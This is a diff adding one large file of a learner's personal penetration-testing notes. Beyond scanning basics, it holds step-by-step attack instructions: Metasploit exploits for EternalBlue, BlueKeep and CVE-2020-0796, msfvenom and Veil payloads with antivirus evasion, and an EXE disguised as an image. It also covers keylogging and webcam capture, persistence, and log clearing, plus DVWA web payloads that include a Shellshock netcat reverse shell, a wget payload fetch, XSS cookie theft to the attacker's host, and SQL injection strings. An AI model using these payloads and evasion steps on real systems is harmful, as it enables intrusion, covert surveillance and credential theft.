@@ -1,0 +1,1146 @@
+ Information gathering
+	> Can't get in trouble
+	> Gather Basic info
+	> get ip address/addresses, emails, phone number, technologies
+	1. Actively: Go to the page of the target website (say Facebook) and gather information through the page
+	2. Passively: go to a page which has details on the target website and get info from their
+	
+	> Get Ip address
+	-Actively 1
+		1. open terminal
+		2. do this: ping TARGET_WEBSITE
+		3. the result is: PING TARGET_WEBSITE (TARGET_IP) 56(84) bytes of data.
+	-Actively 2
+		1. type this: nslookup TARGET_WEBSITE
+		2. go to the bottom where is says Address and that is the target IP
+	-Actively 3
+		1. whois TARGET_MACHINE
+		2. get info (You get more info than required!)
+	-Passively 1
+		1. search up: "what is the IP of this website"
+		2. click on a result and follow steps
+	-Passively 2
+		1. search up ipinfo.info
+		2. enter the IP and get info
+	
+	> Good tools
+	- Whatweb
+		1. typing plain whatweb gives a help menu, typing whatweb --help gives a long and detailed list
+		2. use the items there to help you (Ex. for a simple one "whatweb facebook.com"
+		3. Can give passwords, versions, IP's websites, etc
+			- -a -> aggression level
+			- -v -> printed much better
+			- --no-errors -> clear errors
+	
+	> get emails
+	-The Harvester
+		1. help menu is theHarvester --help
+		2. use "theHarvester -d YOUR_TARGET_URL all"
+		3. sometimes on different days, it will not work
+		4. gives emails
+	-Hunter.io
+		1. search up hunter.io
+		2. create an account and if you try without an account, it will give emails, but emails will be cut
+		3. unpaid means just a few emails and paid means all
+	
+	> download tools from github
+		1. search up tool but add GitHub at the end, Ex. "Sherlock GitHub", "Scanning tools GitHub"
+		2. open the GitHub link, and copy the link at the top
+		3. type "git clone GITHUB_LINK" in command prompt. Make sure you're in the desktop folder
+		4. use the setup provided in the GitHub page
+		5. or, just enter the folder, look for the file that has the program's name (if you download Sherlock, use sherlock.py) and then run it Ex. php rhawk.php, python3 sherlock.py
+	-Red hawk
+		1. download it from GitHub
+		2. navigate to the folder RED_HAWK
+		3. run php rhawk.php
+		4. some things can get you in trouble in this thing
+		5. this gives emails and more
+	- Sherlock
+		1. install Sherlock from GitHub
+		2. navigate to Sherlock
+		3. type "python3 sherlock.py SOME_USERNAME"
+		4. the result will give you email accounts with SOME_USERNAME in the account
+
+
+
+
+
+
+
+
+
+Scanning
+	> Can get in trouble, take permission first
+	> More deeper form of information gathering
+	> Use tech tools to find vulnurability
+	> Ex. Gateways, vulnurability softwares, opening, ports, operating systems
+	> looks for outdated tools in ports
+	
+	>TCP and UDP
+	-TCP
+		> 3 fold communication
+		> most polpular
+		# Steps
+		~ SYN - Computer sends packets to google.com(example)
+		~ SYN/ACK - google.com sends packets to our computer
+		~ ACK - our computer sends package to google.com acknowledging the packages
+	-UDP
+		> user datagram protocol
+		> 2 fold
+		> faster
+		> like tcp, but no checking if we got packets
+		> once a packet is sent, you can't ask for it again
+	
+	> scan networks
+arp
+		1. type "sudo arp --help" for help menu
+		2. use "sudo arp -a" to get all IP's connected to your network
+		3. not that good at all
+	
+	- netdiscover
+		1. just type "sudo netdiscover"
+		2. this scans all IP's on a computer
+	
+	#############################################VERY IMPORTANT#############################################
+	- nmap
+		1. nmap --help for help menu
+		2. type "man nmap" for a big, detailed manual that is longer than the help menu
+		3. type "nmap URL/IP/NETWORKS/ETC"
+		4. this scans for open and closed ports in a target
+		-sub: types
+			
+			----------Useful scans----------
+			> -A
+				1. Aggressive option
+				2. enables -O and -sV
+				3. Nmap scripting
+				4. DO NOT TRY ON TARGETS YOUR’RE NOT ALLOWED TO SCAN
+				5. easily detectible if target has a firewall
+			> -sN
+				1. just discovers up and running hosts
+				2. Useful to not waste an hour scanning a host that's not running
+			> -T
+				1. sets time, speed and accuracy
+				2. modes are: paranoid (0), sneaky(1), polite(2), normal(3), aggressive(4), insane (5)
+				2. T0 and T1 are for IDS evasions
+				4. T2 and T3 does nothing
+				5. T4 assumes you are on a fast network and speeds scans up
+				6. T5 assumes you are on a very fast network, or you are willing to sacrifice accuracy for speed
+			
+			
+			----------Scan Types----------
+			> Syn(-sS)
+				1. never uses full TCP connection
+				2. if target sends a response back, it means it's open
+				3. if it gives a specific output, it is closed.
+				4. if port doesn't give output, it is filtered
+				5. is faster because it doesn't give an ACK back
+			> -ST
+				1. does full handshake
+				2. more trace
+				2. same as normal scan
+			> -sU
+				1. UDP scan
+				2. takes time
+			> -O
+				1. does a regular scan, but also at the end of it, it will show the type of machine it is
+				2. must have at least 1 open and 1 closed port
+			
+			----------Versions----------
+			> -sV
+				1. deeply scans the target
+				2. gives all versions too
+			> -sV --version-intensity NUMBER_FROM_0_TO_9
+				1. normal is 7 intensity
+				2. this does more intense scanning
+			
+			
+			----------Port Scanning----------
+			> -p
+				1. defines what range of ports you want to scan
+				2. type -p 80 (80 is an example) to scan port 80
+				3. type -p 22,80,100 to scan ports 22,80,100
+				3. to scan a range of ports: -p 1-100
+				4. to scan all ports, type -p 1-65535
+			> -F
+				1. scan's top 100 used ports
+				2. not ports 1-100, top common ports, common
+			
+			
+			----------Output----------
+			> ">> file.txt"
+				1. output will be stored in file.txt
+				2. no output to be shown in terminal
+			> -oN output
+				1. prints regular output and saves to file
+				2. File format is normal
+			> -oX output
+				1. prints regular output and saves to file
+				2. file format is XML
+			> -oS output
+				1. prints regular output and saves to file
+				2. file format is ScRipT KIdd|3
+			> -oG output
+				1. prints regular output and saves to file
+				2. file format is Grepable
+			
+			
+			----------Firewall Evasion----------
+			> -f
+				1. sends tiny fragmented IP address
+				2. this makes it harder for intrusion detection and packet detection
+				3. this splits it into 8 bits
+				4. not really useful
+			> -f -f
+				1. same as -f
+				2. this splits into 16 bits
+				3. not really useful
+			
+			> -mtu NUMBER
+				1. splits into fragmented IP's, like -f
+				2. The number has to be a multiple of 8 
+			
+			
+			----------Self Protection----------
+			> -D RND: NUMBER_OF_DECOYS
+				1. adds more IPs to the list of who hacks your machine
+				2. can hide your own IP address
+				3. creates random IP address
+				4. your IP can stick out
+			> -D YOUR_CHOSEN_IP_ADDRESS'S_AND SEPERATE_WITH_COMMA, ME
+				1. target will be hit with the chosen IP addresses
+				2. ME is your IP
+			> -S RANDOM_IP -Pn
+				1. spoof IP address
+				2. won't get results
+				3. -Pn is to assume that the target is online
+				
+				> -g PORT_NUMBER
+					1. hacks on that port
+					2. to bypass IP
+				
+				> -e VALUE
+					1. use Ethernet value, i.e. "eth0"
+
+
+
+
+
+
+
+Vulnerability Analysis
+	----------Nmap----------
+		- sub: Scripts
+			>stored in /usr/share/nmap/scripts
+			> to learn, look at https://nmap.org/book/nse-usage.html
+			
+			----------Types----------
+			> auth
+				1. bypassing authentication
+				2. find credentials
+				3. not for brute force, since brute force is for the brute section
+			> broadcast
+				1. discovery of hosts not listed in command line
+				2. broadcasing on local network to work
+			> brute
+				1. brute force attacks
+				2. guess authentication credentials of a server
+			> discovery
+				1. discover more about the network
+				2. works querying public registries, SNMP-enabled devices, directory services, etc
+			> dos
+				1. may cause a denial of service
+				2. done to test vulnerability to a denial-of-service attack
+				3. can crash vulnerable software programs
+			> exploit
+				1. aim to actively exploit some vulnerability
+			> external
+				1. sends data to a third-party database or other network resource to learn about target
+				2. third-party database may record information such as your IP address
+			> fuzzer
+				1. designed to send target unexpected or randomized fields in each packet
+				2. useful for finding undiscovered bugs and vulnerabilities
+				3. slow process and bandwidth intensive
+			> version
+				1. extension to the version detection feature and cannot be selected explicitly
+				2. detects versions of a target
+				3. selected to run only if version detection (-sV) was requested
+			> malware
+				1. checks whether the target is infected by malware or backdoors
+				2. you can use the infected backdoor to gain access
+			> vuln
+				1. check for specific known vulnerabilities
+				2.generally only report results if they are found
+			> banner
+				1. information disclosure
+				2. versions
+				3. can search up versions for vulnerabilities
+			----------usage----------
+			> Run script group
+				1. type "nmap --script SCRIPT_GROUP IP_ADDRESS"
+				2. this uses the script group you specified to hack
+			> Run individual scripts
+				1. type "nmap --script SCRIPT IP_ADDRESS"
+				2. this will run the script you selected
+				
+			> Help
+				1. for help on a script, type "nmap --script-help SCRIPT_NAME"
+				2. this gives info on the script
+			
+		-sub: outputs
+			> Nmap outputs
+			1. displays the port
+			2. shows the state, normally open/closed
+			3. shows the service running on it
+	
+	> connection
+		> FTP
+			1. to connect using FTP, type "ftp IP_ADDRESS"
+	
+	> find exploits
+		1. search it up
+		2. searchsploit
+		
+		> searchsploit
+			1. type "searchsploit SOFTWARE_VERSION"
+			2. find's exploits
+			
+			
+			
+			
+			
+Gaining access / Exploitation
+	> Use info from phase 1 and 2 to actually hack the machine or website
+	> You can ge into a lot of trouble
+	> also, you can hack a device connected to the target to send code to the target
+	> send a payload to the target exploiting the vulnerabitlity
+	
+	----------Shells----------
+	-shell is our payload
+	> Reverse shell
+		1. we send a message to target telling to connect to our machine
+		2. target connects back onto our kali linux machine
+		3. we run commands
+		4. will always work, since they are connecting to us like we connect to google.com
+	> Bind shell
+		1. we tell target machine to open port to us
+		2. we connect to the port
+		3. we send commands and runs
+		4. might not work, since a firewall says no opening that port
+	
+	#############################################VERY IMPORTANT#############################################
+	> Metasploit framework
+		-to navigate to metasploit framework folder, type cd /usr/share/metasploit-framework
+		- to run, type msfconsole
+		- gives payloads to hack into your target
+	
+		-sub: types/modules
+			> auxiliary
+				1. used for the first 2 stages of a penetration test
+				2. does not execute payload like exploit
+				3. Ex. scanning, fuzzing, denial of service, fingerprinting, vulnerability scanning, etc.
+			> encoders
+				1. helps to evade antivirus detection
+				2. encode payloads, which are like regular viruses to firewalls, to make less detectable
+				3. not that good, as they are known to almost all antiviruses
+			> evasion
+				1. same thing as encoders
+			> exploits
+				1. executes commands to target a specific vulnerability in a system or application
+				2. takes advantage of that vulnerability in order to provide us access to that machine
+				3. Ex. buffer overflow, code injections, web application exploits, etc
+			> nops
+				1. tells a CPU or computer to stop
+				2. can be used to allocate space for payload
+				3. stands for "No OPerationS"
+			> payloads
+				1. deliver to target with an exploit in order to control the machine
+				-Types
+					1. singles -> payloads that are stand alone, ex. adding hacker to database
+					2. stagers -> set up connection between target and hacker, small and reliable
+					3. stages -> payload components downloaded by stagers, ex. shells, meterpeter
+			> post
+				1. after exploitation
+				2. gathers all information on target
+				3. Ex. saved files, passwords, running software programs, etc.
+		
+		- sub: commands
+			> can use commands like ifconfig, cd, ls, etc
+			> type "show MODULE_NAME" to show all files for that module
+	
+	
+		- use exploits in msfconsole
+			> to use exploits, type the command "use MODULE_USING/EXPLOIT_NAME". EXPLOIT_NAME is a directory
+			> this should be like this: "use exploit/windows/smb/ms06_040_netapi"
+			> then you are using the exploit
+			> to get info, type show info
+			> this should the name, module, platorm, arch, priveleged, license, rank, disclosure dte, provider, Stability, reliability, available targets, options, description and reference
+			> type show options to get all customizations
+			> so change anything, type "set OPTION_NAME SETTING_YOU_WANT"
+			> and it will change
+			> to see all payloads available for the exploit, type show payloads
+			> even for payloads, just type "set payload PAYLOAD_NAME"
+			> at the very end, it will show targets, ie. all targets vulnerable to the exploit. to view them all, type chow targets
+			> and again, to change target type "set target LIST_NUMBER". LIST_NUMBER is the number in the list for the exploit
+			> to run the exploit (The good part) type the magic word, "exploit"
+		
+		> Install exploits into metasploitable
+			1. Install wine using the command "sudo dpkg --add-architecture i386 && apt-get update && apt=get install wine32"
+			2. if denied, message shows, enter "sudo su" and type "dpkg --add-architecture i386 && apt-get update && apt=get install wine32"
+			3. wine is to open the "drive_c" folder. It might not appear, so install some windows program
+			4. let's install python 2 for example
+			5. go to https://www.python.org/downloads/release/python2714 and install python Windows x86 MSI Installer
+			6. don't run it, just go open a terminal in where you saved the file
+			7. type in root terminal:  "wine msiexec /i PYTHON_FILE_NAME"
+			8. click on next next all the time.
+			9. wine will now be seen in the /root/ directory
+			10. can't see it? It's a hidden file, so type "ls -la" to see all hidden files
+			11. to enter, type "cd .wine/"
+			12. search up the tool and do for 2 things. 1. add metasploit at the end of your search, 2. There should be a ruby file (".rb" extension)
+			13. Now install the tool
+			14. copy the "deps" folder into a metasploitable framework directory (can't make a new one) using the command "cp deps/ /usr/share/metasploit-framework/modules/REST_OF_PATH -r". The deps might not be there though, and if not, you can look at tutorial
+			15. copy the ruby file using the command: "cp RUBY_FILE /usr/share/metasploit-framework/modules/SAME_PATH_AS_DEPS"
+			16. copy the full folder into the /root/ directory
+			17. now you can use the exploit!
+			18. also, you might have to change a couple of things when you see all options. It's possible!
+			
+		> bruteforce with list into ssh
+			1. open msfconsole
+			2. type "use auxiliary/scanner/ssh/ssh_login"
+			3. type show options
+			4. You can either put a Username, a Password, a Username File, a Password file, or a User pass file
+			5. Create a file if you're using a file option
+			6. to set the file, type "set FIELD path"
+			7. change options like setting RHOSTS, and type run to start
+			8. the shell won't open
+			9. to view all shells, type sessions
+			10. to run the shell, type "sessions -i SESSION_ID"
+	
+	> Netcat
+		- can connect and listen for connections
+		- help menu and usage is "nc -h"
+		- to connect, type "nc OPTIONS HOSTNAME PORT"
+		- ex, "nc 192.168.0.235 50"
+	
+	############################################# Eternal Blue #############################################
+		>Eternal Blue
+			- Eternal blue is a Windows exploit
+			- exploits a mathematical error on port
+			- to check if a device is vulnerable to this exploit, use the auxiliary module "auxiliary/scanner/smb/smb_ms17_010"
+			- to exploit, use the exploit, exploit/windows/smb/ms17_010_eternalblue
+			- for a 64 bit, use the payload "windows/x64/meterpreter/reverse_tcp"
+			- for 32 bit, use "windows/meterpreter/reverce_tcp
+			-n exploit, and you're done!
+		> Double Pulsar
+			- better version of Eternal Blue
+			- more powerful
+			- install using bellow steps
+	
+		
+	> RouterSploit
+		1. install it from GitHub
+		2. type "sudo apt-get install python3-pip"
+		3. Enter the routersploit folder and type "python3 -m pip install -r requirements.txt"
+		4. to run the tool, type "python3 rsf.py"
+		5. "help" shows help menu
+		6. "search scanners" shows all scanners. Scanners are just an example
+		7. to use something, type "use TYPE/NAME"
+		8. to scan a network for vulnerabilities, type "use scanners/autopwn", which scans using all payloads it has
+		9. "show options" shows options
+		10. to set stuff, type "set FEILD_NAME FIELD_VALUE"
+		11. "[-]" means no vulnerability, "[*]" means that it could have a vulnerability, and "[+]" means that it is a vulnerability
+		12. type "run" to run
+	
+	> Default credentials
+		1. search up your routers IP
+		2. this should lead you to some sort of login page
+		3. search up ROUTER_NAME default login credentials
+		4. try to find something, and hack!
+		5. also, you can do a nmap scan and find all software telnet, ssh, etc.
+		6. find default credentials of that will work too
+	
+	> cve-2020-0796 for windows 10
+		1. 19H1 is the version
+		2. install https://github.com/ButrintKomoni/cve-2020-0796 for the scanner
+		3. enter the folder, and type "python3 cve-2020-0796-scanner.py IP_ADDRESS" to run
+		4. if the output shows Vulnerable, then you're in business
+		5. install "https://github.com/jiansiting/CVE-2020-0796"
+		6. enter into the folder
+		7. type "python3 cve-2020-0796.py IP_ADDRESS"
+		8. this will only crash the machine
+		9. install https://github.com/jamf/CVE-2020-0796-RCE-POC
+		10. open the folder
+		11. follow the steps on the GitHub website
+		12. note that you need to run the file that finds the offsets on a machine with the same version as your target
+		13. download
+		14. run the command "msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.18 LPORT=31337 -f python" and copy the buff thing
+		15. open the folder and nano explloit.py
+		16. replace USER_PAYLOAD with buf
+		17. Replace all instances of the plain word buf with USER_PAYLOAD
+		18. set a listener and type "nc -lvp 31337" in a new terminal
+		19. now run in the exploit folder "python3 exploit.py -IP TARGET_IP"
+		
+		
+	############################################# Blue Keep #############################################
+		> Blue Keep
+			- remote code execution like eternal blue
+			- effects on port 3389
+			- port 3389 is for remote desktop access
+			- many large companies have port 3389 open
+			- affects Windows 7, Windows Server 2008, Windows Server 2008 8R2, Windows Server 2003 SP2, Windows Vista and Windows XP
+		
+			1. Auxiliary module -> auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+			2. exploit -> exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+	
+	
+	############################################# MSF VENOM #############################################
+	> msfvenom
+		-Usage
+			1. msfvenom generates payloads but is known by most antivirus software programs
+			2. Using all types, make a payload
+			3. open msfconsole
+			4. then type "use exploit/multi/handler"
+			5. this is just a listener
+			6. change the payload to the payload you used in the payload, and set the LHOST and LPORT appropriately
+			7. now run the file on the target
+		- Types
+			1. -p is payload, so it has windows and everything else Ex. windows/x64/meterpreter/reverse_tcp
+			2. LHOST -> kali linux IP address
+			3. LPORT -> kali linux port that you will be using
+			4. -f -> type of payload
+			5. -o -> output
+			6. -e -> encode and decrypt the payload
+			7. -i -> amount of times to encode the payload
+			8. --platform -> platform target is running on
+			9. -n -> amount of times the processor will do nothing, good for making space
+			10. -x -> make the virus look like another program
+			11. -A -> ARCHITECTURE, EX. x64, x86
+		
+		
+	- view stuff
+		1. "msfvenom --list formats" lists all file types
+		2. "msfvenom -h" shows the help menu
+		3. "msfvenom --list formats" lists all encoders
+	
+	> Veil
+		- installation
+			1. type "apt-get install veil" in sudo terminal
+			2. then type "veil" into the terminal
+			3. this leads to more downloads, and just hit next next next on popups
+			4. this takes like 15 minutes
+			5. then finally run veil to start it up
+		
+		-usage
+			1. you will have 2 options
+			2. there are Evasion payloads, and Ordnance payloads. Just select one by typing "use 1/2"
+			3. commands are like msfconsole, to list payloads, type "list payloads"
+			4. to select, type "use 22"
+			5. typing "options" shows all options required
+			6. to set, type "set FEILD VALUE"
+			7. then, you can add all payloads, encoders, LHOST, LPORT, etc
+			8. typing "generate" generates the payload
+		
+		- use payload
+			1. convert the "source code" part written in the veil output into an exe file
+			2. make sure to use just the bat file
+			3. start up msfconsole and use the "Metasploit Resource file written to" output in the msfconsole
+			4. basically, type: "resource METASPLOIT_RESOURCE_FILE_OUTPUT" in the msfconsole
+	
+	> TheFatRat
+		*************** DO NOT UPLOAD YOUR PAYLOADS TO VIRUS TOTAL ***************
+		1. follow the installation guide on this link: https://github.com/screetsec/TheFatRat
+		2. once installed, open it with sudo privileges
+		3. select payloads, options and everything by typing the number, like "1" or "8"
+		4. set LHOST and LPORT, but anyway it will ask
+		5. when it's finished, remember the folder their, in fact, copy it
+		6. open a listener at the port you set in the payload
+		7. run your payload on the target machine and watch the magic
+	
+	> hexeditor
+		1. make a simple payload with msfvenom
+		2. find its hash by typing "md5sum FILE"
+		3. remember the first 3-4 letters/numbers
+		4. type "hexeditor FILE"
+		5. go to the line where at the side it shows that this payload is...
+		6. each 2 characters stand for 1 character in the text in the right
+	
+	> Look like an image
+		1. make an EXE exploit in msfvenom
+		2. get a PNG image
+		3. convert the PNG to an ICO file. Keep both PNG and ICO file though, they both will be used
+		4. select the PNG and payload
+		5. right click and select add to archive
+		6. select zip as the forma and "Create SFX archive" in archiving options
+		7. then go to advanced and click on "SFX Options"
+		8. in the "Update tab, click on "Extract and Update files" and click on "Overwrite all files"
+		9. In the "Text and Icon" tab, click on "Load SFX icon from the file"
+		10. find your icon and click OK
+		11. in "Modes" click on "hide all" and "Unpack to a temporary folder"
+		12. in "Setup" in the "Run after Extraction" write your PNG file (test.png) and underneath that type your payload file (Shell.exe)
+		13. then click on OK and OK
+		14. open a listener on the port you specified and set the payload appropriately
+
+
+
+
+
+
+
+Maintaining Access
+	> Have access to the target at any time without exploiting again
+	> Plant a backdoor to come to the machine later and get info
+	> Not neccessary
+	
+			
+
+	> Meterpreter commands
+		- help -> shows help menu
+	
+		> COre COmmands
+		- background and bg -> puts the session in the background
+		- exit -> exit shell
+		- sessions -> show all sessions
+		- getuid -> gets what user you are on the session
+		- guid -> gets user GUID
+		
+		> System Commands
+		- cd -> change directory
+		- cat FILE_NAME -> read contents of FILE_NAME
+		- pwd -> print working directory
+		- dir -> list all files
+		- download FILE_NAME -> downloads FILE_NAME from the target
+		- upload FILE_NAME -> uploads FILE_NAME to the target
+		- mk FILE_NAME -> make FILE_NAME
+		- mkdir FOLDER_NAME -> makes FOLDER_NAME
+		- rm FILE_NAME -> remove FILE_NAME
+		- rmdir FOLDER_NAME -> removes FOLDER_NAME
+		- cp FILE FOLDER -> copy FILE to FOLDER
+		
+		> Processes
+		- ps -> see all processes running on target computer
+		- execute PROCESS-> run a PROCESS
+		- kill PROCESS_ID -> stop PROCESS_ID
+		
+		> Network commands
+		- arp -> see all IP's connected to the target
+		- netstat -> prints all connections target has
+		- ifconfig -> shows IP address
+		
+		- shell -> opens shell
+		- getsystem -> tries to go into system privileges, the highest, even higher than the administrator
+		- reboot -> restart target
+		- shutdown -> shutdown target
+		- sysinfo -> get system info
+		
+		> Keylogging
+		- keyscan_start -> starts a keylogger
+		- keyscan_dump -> shows all keys it captured
+		- keyscan_stop -> stops the keylogger
+		- keyboard_send -> send keystrokes
+		- keyevent -> send key events
+		
+		> Mouse
+		- mouse -> gives all uses of the mouse
+		- mouse OPTION -> runs the OPTION
+		
+		- screenshare -> look at the targets desktop in real time, but is a bit buggy
+		- record_mic -d SECONDS -> records the microphone for SECONDS
+		- webcam_snap -> takes a snapshot from target's webcam
+		- webcam_stream -> plays a video from target's webcam
+		- webcam_list -> shows all webcams on target machine
+		- screenshot -> takes a screenshot of target screen
+		
+		
+		> Search
+			- search -h -> shows help menu for the search command
+			- search -f *.FILE_EXTENTION -> searches  the entire target system for files with the extension you put
+			- search -f FILE_NAME.FILE_EXTENTION -> searches the entire target system for that files with the name and extension you put
+		
+		- clearev -> clears all logs
+	
+	> msfconsole
+		> Local
+			- all exploits with local on them are for post exploitation
+		> bypassuac / become system account
+			- typing "search bypassuac" shows useful payloads to get system privileges
+			- make sure to change the port to one that hasn't been used yet
+			- "exploit/windows/local/bypassuac_fodhelper" is a good exploit
+			- with the above exploit, you need to run "getsystem" in the meterpreter shell, and then you will be system level privileges
+		> Persistence
+			- using "persistence" modules, you will stay on the target machine's meterpreter shell even when the target machine is rebooted
+			- make sure to change the port to one that hasn't been used yet
+			- a good module is "exploit/windows/local/persistence_service", but it does require admin or system level permission
+			- set the "SESSION" parameter to whatever session that has admin/system privileges
+			- you can change the "RETRY_TIME" parameter, which is the time(in seconds) taken to retry the exploit
+			- to open it up again, open a new multi/handler exploit with the same port as the persistence exploit
+			- it will open a meterpreter shell
+			- some persistence modules can be buggy
+		> Post Exploitation Modules
+			- you can search for post exploitation modules too
+			- they normally just need the session ID, so It's easy to use them
+			- "post/windows/gather/hashdump" gives you hashes of all users on the target machine
+			- "post/windows/gather/enum_applications" gets all applications on the system
+			- you can just run then in the sessions by typing "run MODULE"
+			- post exploitation modules mostly need system level privileges
+	
+	> copy file easily to other device
+		- type "systemctl start apache2" in your terminal
+		- copy files into the /var/www/html/ folder
+		- in another device, type your kali IP address and view all your files
+
+
+
+
+
+
+
+Covering Track
+	> Remove all evidence that an attack happened
+	> Ex. Remove files, delete logs, etc. Basically revert everything you did
+	> Not neccessary
+
+
+
+
+
+
+
+
+
+
+
+
+Website Application Penetration Testing
+	> Used for code injections, SQL attacks, etc
+	> Code can be run on users who visit the website
+	> Can give use passwords, Usernames, etc
+	> code injections is writing code where your not supposed to
+	> like in a search bar, color reader, ip finder, password form, etc
+	> html and css code will just change the look of a website
+	> only javascript will actually give info to you, and will actually "hack" the website
+	> also, in a username and passowrd field, you can type spl code
+	> even a small error in a website will allow you to "hack" into it
+	
+	Communication
+		- sends an HTTP Request to a website
+			Contains
+			- Host -> website domain
+			- user-agent -> browser client is using
+			- cookies -> values about current session
+			- authorizaton parameters -> to authorize users
+		- you will get an HTTP Response and will get some HTML code of that website
+			Contains
+			- Status Code -> number defining response, ex. 404, 200, 304
+			- Set-Cookie -> establish cookie value to the client to identify and store client and its data
+			- Cache-Control -> content of response should get stored in browser of client or not
+			- Content-Length -> Length of response
+	
+	Information Gathering
+		- you can use whatweb
+		- you can use theHarvester
+		> Dirb
+			1. type dirb for the help menu
+			2. for a simple scan, type "dirb WEBSITE"
+			3. this gives all folders within the WEBSITE
+
+
+	############################################# Burpsuite #############################################	
+	burpsuite
+		- used to intercept http requests and responses
+		- used to edit http requests and responses
+		
+		> setup:
+			1. Open tool and go into proxy
+			2. Click on options
+			3. If there is an IP address saying 127.0.0.1 then click on it and click edit. Otherwise, click on add
+			4. Make the IP address 127.0.0.1 if it is not and make the port be 8080
+			5. Click OK
+			6. Go into Firefox
+			7. Click on the 3 dots at the top right and click settings/preferences
+			8. Scroll down to the bottom where it says Network Settings. Make sure your are in the General tab
+			9. Click on the "Settings..."
+			10. Click on Manual Proxy configuration
+			11. Type 127.0.0.1 in the http Proxy box, and type 8080 in the port box.
+			12. Click the button below, which can either be "use for all ports" or "use for https"
+			13. Click OK
+			14. If you go into https://www.google.com then you will get an error message
+			15. To fix it then go to http://burp
+			16. Click the CA Certificate at the right. This should download the certificate
+			17. Go back into your setting
+			18. Go into privacy and security
+			19. Scroll down to certificates, and click on view certificates
+			20. Click import and then click on “cacert.dir”
+			21. Open the file and click on OK at the bottom of the page.
+			22. Now you are ready!
+
+	############################################# Shellshock #############################################
+	shellshock
+		- used to enter code on a website
+		- very dangerous
+		- unlikely to see in reality since it is really old
+		- from 2014
+		- for computers with shellshock vulnerability, use the exploit "exploit/multi/http/apache_mod_cgi_bash_env_exec" in msfconsole
+	
+		> setup
+			1. download shelshock ISO file from "pentesterlab.com/exercise/cve-2014-6271/attachments"
+			2. make the vm from the ISO file
+			3. go into shellshock vm website
+			4. open up burpsuite
+			5. Go into target and find your connection to the shellshock vm
+			6. click on the commection and right click on the "/cgi-bin/status" section
+			7. select "Send to Repeater"
+			8. click on repeater
+			9. make sure to change whatever is in the "User-Agent" part to "() { :;}; COMMAND"
+			10. to get a shell, change the "User-Agent" part to "() { :;}; /bin/bash -c 'nc YOUR_IP_ADDRESS YOUR_SELECTED_PORT -e /bin/bash '"
+			11. go into your terminal and type "nc -lvp YOUR_SELECTED_PORT"
+	
+	
+	############################################# DVWA #############################################
+	> DVWA (Metasploit)
+	
+		command execution
+			- used to hack into a website and run code
+			- if a website is like a "ping IP" website, you can type the following instead of an IP:
+			- "PARAMETER; COMMAND"
+			- PARAMETER is a correct parameter, and COMMAND is the command you want to run, whether it is downloading an exploit, connecting to netcat, or even just ifconfig
+			- for more advanced security, instead of typing "PARAMETER; COMMAND", type "PARAMETER TOKEN COMMAND"
+			- PARAMETER is a valid parameter, COMMAND is the command you want to execute, and TOKEN is a "delimiter", or a breaking point. TOKEN ex. ";", "&&", "&", "|", "||" etc
+			- example of all: "192.168.1.19 && ls -la" where PARAMETER="192.168.1.19", TOKEN="&&" and COMMAND="ls -la"
+			- Also, PARAMETER isn't actually necessary, and you can just not use it
+			- to upload a payload to the target, you can start Apache web server and paste the payload in the "var/www/html" folder
+			- then, to download the file, you can run the command "; wget http://YOUR_IP_ADDRESS/YOUR_EXPLOIT_NAME"
+			- and finally, you can set up a listener and run the exploit
+		
+		Cross Site Scripting (XSS)
+			- JavaScript code injection
+			- find XSS vulnerability and inject JS code
+			
+			Types
+				> Reflected XSS
+					- only works when you send link with malicious code in it
+					- code is not stored on webpage
+					- when target opens link, js code is executed
+					- used to steal sessions and to mine on targets pc
+					
+					> usage
+						- simply type some JavaScript code like this: <script>YOUR_JAVASCRIPT_CODE</script>
+						- when checking for an XSS vulnerability, replace YOUR_JAVASCRIPT_CODE with "alert('1')", which makes an alert dialogue to appear
+						- in the case of filtering the "<script>" tag, type code like: <scr<script>ipt>YOUR_JAVASCRIPT_CODE</script>
+						- also, you can try: <SCRIPT>YOUR_JAVASCRIPT_CODE</SCRIPT>
+						- steal a cookie do the following steps
+							1. start up a python server using the command: python2 -m SimpleHTTPServer YOUR_SELECTED_PORT
+							2. run this JS code on the website (make sure to add your script tags): document.write('<img src="http://YOUR_IP_ADDRESS:YOUR_SELECTED_PORT/' + document.cookie + ' ">');
+				> Stored XSS
+					- find XSS vulnerability
+					- inject JS code
+					- code is being stored on server
+					- anyone who visits the webpage gets attacked
+					- no special links to be clicked
+					- ex. you post a vulnerable comment on a webpage, and anyone who sees the comment executes the js code
+					
+					> usage
+						- type same JS code as Reflected XSS
+						- code is stored on the page and will be run when a user visits the webpage
+						- if it gets annoying, go to Setup in the DVWA page and click "Create/Reset Database"
+						- if there is a max-length on a certain <input>, navigate to that input in the html and change the maxlength to something else
+				> DOM based XSS
+		
+		HTML injection
+			- HTML code injection
+			- find HTML vulnerability and inject js code
+			- can change the entire code of the website
+			- test in "XSS Reflected" and "XSS Stored" in DVWA
+			
+			> usage
+				- can use <h1> tags, <h2> tags, etc
+				- to make a page unusable, put this code into the webpage: <meta http-equiv="refresh" content="0; url=YOUR_URL_LINK" />
+				- this tries redirecting to YOUR_URL_LINK but refreshes continuously, making the page unusable
+		
+		SQL injection
+			- find user input which communicates with database
+			- send malicious code through this input to get entire db
+			
+			> usage
+				- to check for SQL bugs, type a special character like " ' " and if you get an error, SQL injection vulnerability is there
+				- to get db name and db user, type the following: APPROPRIATE_INPUT' union SELECT database(),user() -- '
+				- to get different databases, type: APPROPRIATE_INPUT' union SELECT schema_name, 2 FROM information_schema.schemata -- '
+				- to get tables in a database, type: APPROPRIATE_INPUT' union SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'DATABASE_NAME' -- '
+				- to get column names from a table, type: APPROPRIATE_INPUT' union SELECT column_name, column_type FROM information_schema.columns WHERE table_schema = 'DATABASE_NAME' AND table_name = 'TABLE_NAME' --'
+				- to get information from a table, you might need to concat some fields. Type: 
+					APPROPRIATE_INPUT' union SELECT concat(FIELD, DELIMITER, FIELD), concat(FIELD, DELIMITER, FIELD) from DATABASE_NAME.TABLE_NAME -- '
+		
+		Cross Site Request Forgery (CSRF)
+			- exploit web function that searches for a request in a session
+			- used to change usernames and passwords
+			- can make fake banking transactions
+			- difficult, since users need to click on link
+			
+			> usage
+				- first, make an exact replica of the target page, and host it on Apache web server
+				- then, find a <form> field and set 'action="TARGET_PAGE_LINK"'
+				- also, make sure you store the username and password input
+				- that is how you find passwords and username
+				- if you want, you can add an attribute to the <input> fields saying 'value="VALUE"'
+				- this is how to set your own password
+		
